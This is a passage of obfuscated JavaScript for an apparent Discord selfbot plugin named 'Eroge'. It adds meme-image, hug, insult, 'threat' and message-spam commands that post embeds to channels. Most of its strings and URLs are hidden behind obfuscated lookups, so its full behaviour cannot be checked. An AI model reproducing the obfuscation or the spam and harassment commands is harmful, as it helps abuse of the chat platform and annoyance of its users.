abdrahman(461))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1128), "***Deepfry the member mentionned***")[abdrahman(695)](abdrahman(712) + PREFIX + "fact + TEXT ```***", abdrahman(994))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1296), "***Send the image in an iphoneX***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(596), "***Send the image in jpeg format***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(263), abdrahman(1355))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(600), abdrahman(466))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1401), "***Change the pfp to member to a weird image***").addField(abdrahman(712) + PREFIX + "ship + MENTION + TEXT ```***", abdrahman(1071))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(678), abdrahman(1209))[abdrahman(695)](abdrahman(712) + PREFIX + "cry ```***", abdrahman(277)), darsie = (new sherae.RichEmbed)[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1328), abdrahman(1098))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1194), abdrahman(669))[abdrahman(695)](abdrahman(712) + PREFIX + "smug ```***", abdrahman(1414))[abdrahman(695)](abdrahman(712) + PREFIX + "hug + MENTION ```***", "***Give a hug to the user mentioned***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1369), "***Want to commit a suicide***").addField(abdrahman(712) + PREFIX + abdrahman(257), abdrahman(501))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1075), "***catch some fish***")[abdrahman(695)](abdrahman(712) + PREFIX + "sadcat ```***", abdrahman(1456))[abdrahman(695)]("***```" + PREFIX + abdrahman(1109), abdrahman(650))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1104), abdrahman(826))[abdrahman(695)](abdrahman(712) + PREFIX + "wasted + MENTION ```***", "***Wasted the user mentioned***")[abdrahman(695)]("***```" + PREFIX + abdrahman(1402), abdrahman(420))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(697), abdrahman(807))[abdrahman(695)]("***```" + PREFIX + "insult ```***", abdrahman(893))[abdrahman(695)]("***```" + PREFIX + abdrahman(1053), abdrahman(1058)).addField(abdrahman(712) + PREFIX + abdrahman(1292), abdrahman(577))[abdrahman(695)]("***```" + PREFIX + abdrahman(754), abdrahman(683)).addField(abdrahman(712) + PREFIX + abdrahman(970), "***Send empty edited message***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(948), "***Threat someone with his pfp***").addField(abdrahman(712) + PREFIX + abdrahman(1233), "***Trap someone send the trap card***").addField(abdrahman(712) + PREFIX + abdrahman(1086), abdrahman(1399)).addField("***```" + PREFIX + abdrahman(243), "***Send a tweet with the username of user and the text***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(359), abdrahman(310)), callyn = (new sherae.RichEmbed)[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(822), abdrahman(802))[abdrahman(1211)](IMAGE).setFooter(abdrahman(899), IMAGE);
          callyn.setTimestamp(), jillian.channel[abdrahman(746)](jasjeet), jillian[abdrahman(407)].send(darsie), jillian.channel[abdrahman(746)](callyn);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(825))) {
          const lakenia = jillian[abdrahman(726)].users[abdrahman(911)]();
          let marcellus = maverick[abdrahman(1063)](1)[abdrahman(463)](" ");
          jillian.delete();
          if (!lakenia) return window.BdApi[abdrahman(1248)](abdrahman(1078), "You need mention someone. ❌");
          if (!marcellus) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(823));
          indeya();
          async function indeya() {
            const kaid = abdrahman;
            let desha = lakenia.id, drace = lakenia[kaid(1167)], lanaria = kaid(283) + desha + "/" + drace + ".png?size=1024";
            const prit = await _0xe6e37f(encodeURI(kaid(941) + lakenia.username + kaid(365) + lanaria + "&text=" + marcellus)), mekayla = await prit[kaid(507)](), oleta = (new sherae.RichEmbed)[kaid(1211)](mekayla.message)[kaid(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            oleta[kaid(1264)](), jillian[kaid(407)][kaid(746)](oleta);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "trumptweet")) {
          let srinija = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!srinija) return window.BdApi[abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(823));
          annetra();
          async function annetra() {
            const wahaj = abdrahman, breshawn = await _0xe6e37f(encodeURI(wahaj(319) + srinija)), janacia = await breshawn[wahaj(507)](), kinslei = (new sherae[wahaj(344)])[wahaj(1211)](janacia[wahaj(568)]).setFooter(wahaj(899), IMAGE);
            kinslei.setTimestamp(), jillian[wahaj(407)].send(kinslei);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(844))) {
          let tanaisa = jillian[abdrahman(393)].split(" ")[1], krisinda = maverick.slice(1).join(" ");
          jillian.delete();
          if (!tanaisa) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", abdrahman(448));
          if (!krisinda) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", "You need enter a message. ❌");
          var kiwanis = encodeURI(krisinda);
          const dreyven = (new sherae[abdrahman(344)]).setImage("https://minecraftskinstealer.com/achievement/" + tanaisa + "/Achievement+Get%21/" + kiwanis)[abdrahman(938)](abdrahman(899), IMAGE);
          dreyven[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](dreyven);
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(430))) {
          const jese = jillian[abdrahman(726)].users.first();
          jillian[abdrahman(1289)]();
          if (!jese) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", "You need mention someone. ❌");
          shamese();
          async function shamese() {
            const reyaan = abdrahman;
            let kartika = maverick[reyaan(1063)](0).join(" "), nuraiz = await _0x3857f[reyaan(1107)]("awooify", {url: jese.avatarURL});
            cirrus(1e3);
            let sherrard = (new sherae[reyaan(344)]).setColor(COLOR)[reyaan(1044)](reyaan(710))[reyaan(1211)](nuraiz)[reyaan(938)](reyaan(899), IMAGE);
            sherrard[reyaan(1264)](), jillian[reyaan(407)][reyaan(746)](sherrard);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1265))) {
          const chinemelum = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!chinemelum) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", "You need mention someone. ❌");
          nayli();
          async function nayli() {
            const mulan = abdrahman;
            let damarlo = maverick[mulan(1063)](0)[mulan(463)](" "), nataija = await _0x3857f[mulan(1107)](mulan(1265), {url: chinemelum[mulan(879)]});
            cirrus(1e3);
            let zakiy = (new sherae[mulan(344)])[mulan(321)](COLOR)[mulan(1044)]("***Baguette 🥖***")[mulan(1211)](nataija)[mulan(938)](mulan(899), IMAGE);
            zakiy[mulan(1264)](), jillian[mulan(407)].send(zakiy);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "blurpify")) {
          const trinitey = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!trinitey) return window.BdApi[abdrahman(1248)]("🔪 Eroge Notification 🔪", "You need mention someone. ❌");
          detria();
          async function detria() {
            const leoma = abdrahman;
            let donalda = maverick[leoma(1063)](0).join(" "), shinichi = await _0x3857f[leoma(1107)](leoma(318), {image: trinitey[leoma(879)]});
            cirrus(1e3);
            let anvee = (new sherae[leoma(344)]).setColor(COLOR).setTitle(leoma(1273)).setImage(shinichi)[leoma(938)](leoma(899), IMAGE);
            anvee[leoma(1264)](), jillian[leoma(407)][leoma(746)](anvee);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(784))) {
          const chenice = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          let nelse = maverick.slice(1).join(" ");
          jillian[abdrahman(1289)]();
          if (!chenice) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          if (!nelse) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(823));
          krishawna();
          async function krishawna() {
            const corderius = abdrahman;
            let madella = await _0x3857f[corderius(1107)]("captcha", {url: chenice[corderius(879)], username: nelse});
            cirrus(1e3);
            let jshun = (new sherae[corderius(344)])[corderius(321)](COLOR).setTitle(corderius(734))[corderius(1211)](madella)[corderius(938)](corderius(899), IMAGE);
            jshun[corderius(1264)](), jillian.channel[corderius(746)](jshun);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1051))) {
          jillian.delete();
          let breara = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          if (!breara) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(898));
          gottfried();
          async function gottfried() {
            const joeleigh = abdrahman;
            let terresha = await _0x3857f[joeleigh(1107)](joeleigh(1051), {text: breara});
            cirrus(1e3);
            let jameire = (new sherae[joeleigh(344)])[joeleigh(321)](COLOR).setTitle(joeleigh(985))[joeleigh(1211)](terresha)[joeleigh(938)](joeleigh(899), IMAGE);
            jameire[joeleigh(1264)](), jillian[joeleigh(407)][joeleigh(746)](jameire);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "testlove")) {
          const marquitta = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!marquitta) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need mention someone. ❌");
          var gustava = ["5%", "10%", "15%", abdrahman(338), "25%", abdrahman(1156), abdrahman(376), abdrahman(414), "45%", abdrahman(833), "55", abdrahman(1310), "65%", abdrahman(730), abdrahman(1231), "80%", abdrahman(1426), abdrahman(886), abdrahman(1347), abdrahman(329)][Math.floor(Math[abdrahman(1240)]() * 20)];
          let jermoni = (new sherae[abdrahman(344)])[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(373) + shadarria[abdrahman(1417)][abdrahman(1423)] + abdrahman(1340) + marquitta[abdrahman(1423)] + "", "" + gustava + " ❤")[abdrahman(1211)](abdrahman(508))[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          jermoni[abdrahman(1264)](), jillian[abdrahman(407)].send(jermoni);
        }
        jillian[abdrahman(393)].startsWith(PREFIX + "loading") && (setTimeout(() => {
          const leianna = abdrahman;
          jillian.edit(leianna(1324));
        }, 1e3), setTimeout(() => {
          const shaunea = abdrahman;
          jillian[shaunea(930)](shaunea(639));
        }, 3500), setTimeout(() => {
          const chevi = abdrahman;
          jillian[chevi(930)](chevi(1241));
        }, 9e3), setTimeout(() => {
          const mykhi = abdrahman;
          jillian[mykhi(930)](mykhi(651));
        }, 13500), setTimeout(() => {
          jillian.edit("▓▓▓▓▓▓▓▓░░ 80%");
        }, 19e3), setTimeout(() => {
          const ebay = abdrahman;
          jillian.edit(ebay(1255));
        }, 25500), setTimeout(() => {
          const randiel = abdrahman;
          jillian[randiel(930)](randiel(1148));
        }, 26500));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(467))) {
          let reyd = maverick.slice(0)[abdrahman(463)](" ");
          if (!reyd) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1011));
          var amaria = [abdrahman(790), abdrahman(1117), abdrahman(1032), abdrahman(795), abdrahman(714), abdrahman(278), abdrahman(1407)][Math[abdrahman(250)](Math[abdrahman(1240)]() * 7)];
          jillian.channel.send("**" + shadarria[abdrahman(1417)].tag + abdrahman(375) + reyd + "**");
          let cathyjo = (new sherae.RichEmbed).setColor(COLOR)[abdrahman(1044)](abdrahman(666))[abdrahman(457)](amaria)[abdrahman(938)](abdrahman(899), IMAGE);
          cathyjo[abdrahman(1264)](), jillian.channel[abdrahman(746)](cathyjo);
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(348))) {
          let aneea = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!aneea) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(898));
          nevia();
          async function nevia() {
            const zeshaun = abdrahman;
            let siddanth = await _0x3857f[zeshaun(1107)](zeshaun(348), {text: aneea});
            cirrus(1e3);
            let xavi = (new sherae[zeshaun(344)])[zeshaun(321)](COLOR)[zeshaun(1211)](siddanth)[zeshaun(938)](zeshaun(899), IMAGE);
            xavi[zeshaun(1264)](), jillian.channel[zeshaun(746)](xavi);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1463))) {
          const wilisha = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian.delete();
          if (!wilisha) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          chamia();
          async function chamia() {
            const merrie = abdrahman;
            let hamzeh = await _0x3857f[merrie(1107)]("deepfry", {image: wilisha.avatarURL});
            cirrus(1e3);
            let dalvin = (new sherae[merrie(344)])[merrie(321)](COLOR)[merrie(1211)](hamzeh)[merrie(938)](merrie(899), IMAGE);
            dalvin[merrie(1264)](), jillian.channel[merrie(746)](dalvin);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(747))) {
          let deliza = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!deliza) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(898));
          jenella();
          async function jenella() {
            const analecia = abdrahman;
            let leviana = await _0x3857f[analecia(1107)](analecia(747), {text: deliza});
            cirrus(1e3);
            let phynix = (new sherae[analecia(344)]).setColor(COLOR)[analecia(1211)](leviana)[analecia(938)](analecia(899), IMAGE);
            phynix[analecia(1264)](), jillian[analecia(407)][analecia(746)](phynix);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(850))) {
          let branoon = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!branoon) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", "You need enter a text. ❌");
          oluwafunmilola();
          async function oluwafunmilola() {
            const vida = abdrahman;
            let shyhem = await _0x3857f[vida(1107)]("iphonex", {url: branoon});
            cirrus(1e3);
            let lazaya = (new sherae.RichEmbed).setColor(COLOR)[vida(1211)](shyhem).setFooter(vida(899), IMAGE);
            lazaya.setTimestamp(), jillian[vida(407)][vida(746)](lazaya);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(493))) {
          let blase = maverick[abdrahman(1063)](0).join(" ");
          jillian[abdrahman(1289)]();
          if (!blase) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(898));
          brittanae();
          async function brittanae() {
            const willisa = abdrahman;
            let guliana = await _0x3857f[willisa(1107)]("jpeg", {url: blase});
            cirrus(1e3);
            let carmeisha = (new sherae[willisa(344)])[willisa(321)](COLOR)[willisa(1211)](guliana).setFooter(willisa(899), IMAGE);
            carmeisha[willisa(1264)](), jillian[willisa(407)][willisa(746)](carmeisha);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "kannagen")) {
          let bacilia = maverick[abdrahman(1063)](0).join(" ");
          jillian.delete();
          if (!bacilia) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", "You need enter a text. ❌");
          learah();
          async function learah() {
            const jamarrio = abdrahman;
            let meris = await _0x3857f[jamarrio(1107)]("kannagen", {text: bacilia});
            cirrus(1e3);
            let ravonte = (new sherae[jamarrio(344)])[jamarrio(321)](COLOR)[jamarrio(1211)](meris)[jamarrio(938)](jamarrio(899), IMAGE);
            ravonte[jamarrio(1264)](), jillian[jamarrio(407)].send(ravonte);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "lolice")) {
          let stanya = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!stanya) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(898));
          yency();
          async function yency() {
            const udora = abdrahman;
            let johnavan = await _0x3857f.generate("lolice", {url: stanya});
            cirrus(1e3);
            let demyri = (new sherae[udora(344)]).setColor(COLOR)[udora(1211)](johnavan)[udora(938)](udora(899), IMAGE);
            demyri[udora(1264)](), jillian.channel.send(demyri);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "magik")) {
          const vandetta = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!vandetta) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(1366));
          auree();
          async function auree() {
            const donyae = abdrahman;
            let zyden = await _0x3857f[donyae(1107)](donyae(816), {image: vandetta.avatarURL});
            cirrus(1e3);
            let marliee = (new sherae[donyae(344)])[donyae(321)](COLOR).setImage(zyden).setFooter(donyae(899), IMAGE);
            marliee[donyae(1264)](), jillian[donyae(407)].send(marliee);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1480))) {
          const natalye = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          let melford = maverick.slice(1)[abdrahman(463)](" ");
          jillian.delete();
          if (!natalye) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          if (!melford) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(898));
          barbarba();
          async function barbarba() {
            const christion = abdrahman;
            let journy = await _0x3857f[christion(1107)](christion(1480), {user1: melford, user2: natalye.avatarURL});
            cirrus(1e3);
            let ligita = (new sherae[christion(344)]).setColor(COLOR).setImage(journy)[christion(938)](christion(899), IMAGE);
            ligita.setTimestamp(), jillian[christion(407)][christion(746)](ligita);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(558))) {
          const dereonna = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!dereonna) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(1366));
          _0x1c3e17[abdrahman(558)]()[abdrahman(656)](laqueta => {
            const corbyn = abdrahman;
            var tomacina = laqueta;
            let ashaiya = (new sherae[corbyn(344)])[corbyn(1044)](corbyn(692) + jillian[corbyn(887)][corbyn(1423)] + " ***give a kiss to*** " + dereonna[corbyn(1423)] + corbyn(306))[corbyn(321)](COLOR).setImage(tomacina).setFooter(corbyn(899), IMAGE);
            ashaiya[corbyn(1264)](), jillian[corbyn(407)][corbyn(746)](ashaiya);
          });
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1119)) && (jillian[abdrahman(1289)](), _0x1c3e17[abdrahman(1119)]()[abdrahman(656)](kimarley => {
          const tonique = abdrahman;
          var maadhav = kimarley;
          let quanaisha = (new sherae[tonique(344)])[tonique(1044)](jillian.author[tonique(1423)] + tonique(1177))[tonique(321)](COLOR)[tonique(1211)](maadhav)[tonique(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          quanaisha[tonique(1264)](), jillian[tonique(407)][tonique(746)](quanaisha);
        }));
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(590))) {
          const blynn = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian.delete();
          if (!blynn) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          _0x1c3e17[abdrahman(590)]().then(madeleina => {
            const eliseo = abdrahman;
            var tilley = madeleina;
            let ziyona = (new sherae[eliseo(344)])[eliseo(1044)](eliseo(471) + jillian.author[eliseo(1423)] + eliseo(238) + blynn[eliseo(1423)] + eliseo(306))[eliseo(321)](COLOR).setImage(tilley).setFooter(eliseo(899), IMAGE);
            ziyona[eliseo(1264)](), jillian.channel[eliseo(746)](ziyona);
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(266))) {
          const mordecai = jillian[abdrahman(726)][abdrahman(543)].first();
          jillian[abdrahman(1289)]();
          if (!mordecai) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          _0x1c3e17[abdrahman(842)]()[abdrahman(656)](hallene => {
            const therald = abdrahman;
            var audris = hallene;
            let jagger = (new sherae.RichEmbed)[therald(1044)]("👋 " + jillian.author[therald(1423)] + therald(537) + mordecai.username + therald(619)).setColor(COLOR)[therald(1211)](audris)[therald(938)](therald(899), IMAGE);
            jagger[therald(1264)](), jillian[therald(407)][therald(746)](jagger);
          });
        }
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(1458)) && (jillian[abdrahman(1289)](), _0x1c3e17[abdrahman(1458)]()[abdrahman(656)](navil => {
          const oghenetega = abdrahman;
          var ogheneruno = navil;
          let melanii = (new sherae[oghenetega(344)])[oghenetega(1044)](jillian[oghenetega(887)][oghenetega(1423)] + " smug 😏")[oghenetega(321)](COLOR)[oghenetega(1211)](ogheneruno)[oghenetega(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          melanii.setTimestamp(), jillian.channel[oghenetega(746)](melanii);
        }));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1013))) {
          const temiloluwa = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!temiloluwa) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(1366));
          _0x1c3e17[abdrahman(1013)]()[abdrahman(656)](orman => {
            const axelle = abdrahman;
            var yaslynn = orman;
            let manvel = (new sherae[axelle(344)])[axelle(1044)](axelle(1432) + jillian[axelle(887)][axelle(1423)] + axelle(406) + temiloluwa.username + axelle(1019))[axelle(321)](COLOR)[axelle(1211)](yaslynn)[axelle(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            manvel[axelle(1264)](), jillian[axelle(407)].send(manvel);
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(877))) {
          const laike = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian.delete();
          if (!laike) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          _0x1c3e17[abdrahman(877)]()[abdrahman(656)](barba => {
            const saragrace = abdrahman;
            var tramayne = barba;
            let krisanne = (new sherae[saragrace(344)])[saragrace(1044)](saragrace(906) + jillian.author.username + saragrace(557) + laike.username + saragrace(306))[saragrace(321)](COLOR)[saragrace(1211)](tramayne)[saragrace(938)](saragrace(899), IMAGE);
            krisanne[saragrace(1264)](), jillian[saragrace(407)][saragrace(746)](krisanne);
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(258))) {
          jillian.delete();
          const kyion = [abdrahman(308), "https://i.imgur.com/FwLP4uD.gif", abdrahman(1165), "https://i.imgur.com/vmg8wiK.gif"];
          let mida = (new sherae[abdrahman(344)])[abdrahman(1044)](jillian.author.username + abdrahman(839))[abdrahman(321)](COLOR)[abdrahman(1211)](kyion[Math[abdrahman(250)](Math[abdrahman(1240)]() * kyion[abdrahman(1108)])])[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          mida.setTimestamp(), jillian[abdrahman(407)][abdrahman(746)](mida);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1393))) {
          const shiana = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!shiana) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          const datari = ["https://thumbs.gfycat.com/GlaringWetAsiandamselfly-size_restricted.gif", abdrahman(681), abdrahman(1066), abdrahman(1122), "https://thumbs.gfycat.com/LikelyPertinentIslandwhistler-size_restricted.gif", abdrahman(1237), abdrahman(1123), abdrahman(240)];
          let alfredia = (new sherae[abdrahman(344)]).setTitle(jillian.author[abdrahman(1423)] + abdrahman(871) + shiana[abdrahman(1423)] + " ")[abdrahman(321)](COLOR).setImage(datari[Math.floor(Math[abdrahman(1240)]() * datari.length)])[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          alfredia.setTimestamp(), jillian[abdrahman(407)][abdrahman(746)](alfredia);
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(668))) {
          let sorai = ["🦑", "🦐", "🦀", "🐚", "🐙", "🦈", "🐡", "🐠", "🐟", "🐬", "🐋", "🐳", "🐢"], fain = Math[abdrahman(250)](Math[abdrahman(1240)]() * sorai[abdrahman(1108)]);
          var xochiquetzal = (new sherae[abdrahman(344)]).setAuthor("🐋 Fish").setColor(COLOR).addField(abdrahman(933), sorai[fain])[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          xochiquetzal[abdrahman(1264)](), jillian[abdrahman(407)].send(xochiquetzal);
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "sadcat") && (jillian[abdrahman(1289)](), _0x4d876d({uri: abdrahman(366), headers: {}, json: !![], method: abdrahman(875)}, function (kouture, sherone, amiriah) {
          const nicanor = abdrahman;
          var wellsley = sherone[nicanor(759)].file, renald = (new sherae[nicanor(344)])[nicanor(1044)](nicanor(674))[nicanor(1211)](wellsley)[nicanor(321)](COLOR).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          renald[nicanor(1264)](), jillian[nicanor(407)][nicanor(746)](renald);
        }));
        jillian.content.startsWith(PREFIX + abdrahman(954)) && (jillian.delete(), _0x4d876d({uri: abdrahman(1438), headers: {}, json: !![], method: abdrahman(875)}, function (javarie, chadwick, riaan) {
          const alby = abdrahman;
          var giavannah = chadwick.body.link, jacarria = (new sherae[alby(344)])[alby(1044)]("**" + jillian.author[alby(1423)] + alby(720))[alby(1211)](giavannah)[alby(321)](COLOR)[alby(938)](alby(899), IMAGE);
          jacarria[alby(1264)](), jillian[alby(407)][alby(746)](jacarria);
        }));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(550))) {
          const kewana = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!kewana) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          var berend = (new sherae[abdrahman(344)])[abdrahman(1044)]("**" + jillian.author.username + abdrahman(1334) + kewana[abdrahman(1423)] + abdrahman(1022)).setImage(abdrahman(622) + kewana[abdrahman(879)]).setColor(COLOR)[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          berend[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](berend);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "wasted")) {
          const kartez = jillian[abdrahman(726)].users[abdrahman(911)]();
          jillian.delete();
          if (!kartez) return window.BdApi.alert(abdrahman(1078), abdrahman(1366));
          var berend = (new sherae[abdrahman(344)])[abdrahman(1044)]("**" + jillian.author[abdrahman(1423)] + " have wasted " + kartez[abdrahman(1423)] + "**").setImage("https://some-random-api.ml/canvas/wasted?avatar=" + kartez[abdrahman(879)])[abdrahman(321)](COLOR).setFooter(abdrahman(899), IMAGE);
          berend[abdrahman(1264)](), jillian.channel[abdrahman(746)](berend);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "triggered")) {
          const izetta = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!izetta) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", abdrahman(1366));
          var berend = (new sherae.RichEmbed).setTitle(abdrahman(1097))[abdrahman(1211)](abdrahman(1476) + izetta[abdrahman(879)])[abdrahman(321)](COLOR).setFooter(abdrahman(899), IMAGE);
          berend[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](berend);
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(627)) && (jillian.delete(), jillian[abdrahman(407)][abdrahman(746)](abdrahman(615)), jillian.channel[abdrahman(746)](abdrahman(1103)), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1164)), jillian.channel.send(abdrahman(624)), jillian[abdrahman(407)].send(abdrahman(1381)), jillian[abdrahman(407)][abdrahman(746)](abdrahman(453)), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1005)), jillian[abdrahman(407)][abdrahman(746)]("Eiffel initially showed little enthusiasm, but he did approve further study, and the two engineers then asked Stephen Sauvestre, the head of company's architectural department, to contribute to the design."), jillian[abdrahman(407)][abdrahman(746)](abdrahman(960)), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1239)), jillian.channel[abdrahman(746)](abdrahman(567)), jillian[abdrahman(407)][abdrahman(746)]("Little progress was made until 1886, when Jules Grévy was re-elected as president of France and Édouard Lockroy was appointed as minister for trade. A budget for the exposition was passed and, on 1 May, Lockroy announced an alteration to the terms of the open competition being held for a centrepiece to the exposition, which effectively made the selection of Eiffel's design a foregone conclusion, as entries had to include a study for a 300 m (980 ft) four-sided metal tower on the Champ de Mars."));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(364))) {
          const darryn = jillian.mentions[abdrahman(543)][abdrahman(911)]();
          jillian.delete();
          if (!darryn) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(768));
          var yaeno = darryn.username;
